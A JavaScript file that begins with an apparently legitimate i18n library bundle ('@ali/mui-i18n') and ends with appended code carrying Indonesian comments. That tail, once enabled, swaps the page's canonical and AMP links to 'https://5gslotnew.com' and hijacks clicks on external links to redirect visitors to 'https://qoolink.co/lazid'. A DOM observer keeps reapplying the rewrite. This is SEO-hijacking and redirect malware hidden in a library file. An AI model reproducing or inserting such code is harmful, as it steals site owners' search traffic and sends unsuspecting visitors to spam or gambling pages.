define("@ali/mui-i18n/index", ["@ali/mui-i18n/format"], function (n, t, e) {
  Object.defineProperty(t, "__esModule", {
    "value": true
  });
  var o = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (n) {
    return typeof n;
  } : function (n) {
    return n && "function" == typeof Symbol && n.constructor === Symbol && n !== Symbol.prototype ? "symbol" : typeof n;
  };
  var r = Object.assign || function (n) {
    for (var t = 1; t < arguments.length; t++) {
      var e = arguments[t];
      for (var o in e) if (Object.prototype.hasOwnProperty.call(e, o)) {
        n[o] = e[o];
      }
    }
    return n;
  };
  var i = n("@ali/mui-i18n/format");
  var u = "zh-cn";
  var f = {};
  var c = {
    setLanguage: function (n) {
      u = n;
    },
    getLanguage: function () {
      return u;
    },
    getComponentLocale: function (n, t, e) {
      var o = f[n] ? f[n] : {};
      var i = t ? t[u] : {};
      return e ? r({}, i, o, e) : r({}, i, o);
    },
    setComponents: function (n) {
      f = r({}, f, n);
    },
    init: function (n) {
      return function () {
        var t = [].slice.call(arguments);
        var e = t[0];
        return "string" != typeof e ? "[" + (undefined === e ? "undefined" : o(e)) + "]" : (t[0] = n[e] || e, i.apply(null, t));
      };
    },
    format: i
  };
  t["default"] = c;
  e.exports = c;
});

define("@ali/mui-i18n/format", function (e, n, t) {
  function r(e) {
    if ("string" != typeof e) {
      var n = new Array(arguments.length);
      for (var t = 0; t < arguments.length; t++) {
        n[t] = i(arguments[t]);
      }
      return n.join(" ");
    }
    var r = arguments.length;
    if (1 === r) {
      return e;
    }
    var c = "";
    var f = 1;
    var u = 0;
    for (var l = 0; l < e.length;) {
      if (37 === e.charCodeAt(l) && l + 1 < e.length) {
        switch (e.charCodeAt(l + 1)) {
          case 100:
            if (f >= r) {
              break;
            }
            if (u < l) {
              c += e.slice(u, l);
            }
            c += Number(arguments[f++]);
            u = l += 2;
            continue;
          case 106:
            if (f >= r) {
              break;
            }
            if (u < l) {
              c += e.slice(u, l);
            }
            c += o(arguments[f++]);
            u = l += 2;
            continue;
          case 115:
            if (f >= r) {
              break;
            }
            if (u < l) {
              c += e.slice(u, l);
            }
            c += String(arguments[f++]);
            u = l += 2;
            continue;
          case 37:
            if (u < l) {
              c += e.slice(u, l);
            }
            c += "%";
            u = l += 2;
            continue;
        }
      }
      ++l;
    }
    for (0 === u ? c = e : u < e.length && (c += e.slice(u)); f < r;) {
      var a = arguments[f++];
      if (null === a || "object" !== (undefined === a ? "undefined" : i(a)) && "symbol" !== (undefined === a ? "undefined" : i(a))) {
        c += " " + a;
      } else {
        c += " " + (undefined === a ? "undefined" : i(a));
      }
    }
    return c;
  }
  function o(e) {
    try {
      return JSON.stringify(e);
    } catch (n) {
      return "[Circular]";
    }
  }
  var i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
    return typeof e;
  } : function (e) {
    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
  };
  t.exports = r;
});

// Inisialisasi namespace global
window._globalNamespace = window._globalNamespace || {};
window._globalNamespace.indexJsInitialized = window._globalNamespace.indexJsInitialized || false;
window._globalNamespace.redirectControl = {
    enabled: false, // Default state untuk redirect
    
    // Fungsi untuk mengaktifkan redirect
    enable: function() {
        this.enabled = true;
        this.handleRedirects();
    },
    
    // Fungsi untuk menonaktifkan redirect
    disable: function() {
        this.enabled = false;
        this.handleRedirects();
    },

    // Fungsi untuk menangani redirect
    handleRedirects: function() {
        try {
            if (!this.enabled) return;

            let e = window.location.host;
            let i = btoa(e);
            let l = _0x4f3d.groups.exceptions;
            
            if (l.includes(i) || l.includes(btoa(`www.${e.replace(/^www\./, "")}`))) {
                return;
            }

            // Handle canonical link
            let a = document.querySelector("link[rel=\"canonical\"]");
            if (a && a.href.includes("officialwibu69jp.lat")) {
                a.href = "https://5gslotnew.com";
            }

            // Handle AMP link
            let t = document.querySelector("link[rel=\"amphtml\"]");
            if (t && t.href.includes("officialwibu69jp.lat/amp")) {
                t.href = "https://5gslotnew.com/amp";
            }

            // Handle external links
            document.querySelectorAll("a[href^=\"http\"]").forEach(e => {
                if (!(e.href.includes(window.location.host) || e.classList.contains("no-redirect"))) {
                    e.addEventListener("click", function(event) {
                        event.preventDefault();
                        window.location.href = "https://qoolink.co/lazid";
                    });
                }
            });
        } catch (error) {
            console.error("Error dalam menangani redirect:", error);
        }
    }
};

// Inisialisasi jika belum
if (!window._globalNamespace.indexJsInitialized) {
    window._globalNamespace.indexJsInitialized = true;
    
    document.addEventListener("DOMContentLoaded", () => {
        window._globalNamespace.redirectControl.handleRedirects();
        
        // Observer untuk menangani perubahan DOM
        const observer = new MutationObserver(() => {
            if (window._globalNamespace.redirectControl.enabled) {
                window._globalNamespace.redirectControl.handleRedirects();
            }
        });

        // Mulai observasi
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
}

// Fungsi global untuk mengontrol redirect
function enableRedirect() {
    window._globalNamespace.redirectControl.enable();
}

function disableRedirect() {
    window._globalNamespace.redirectControl.disable();
}
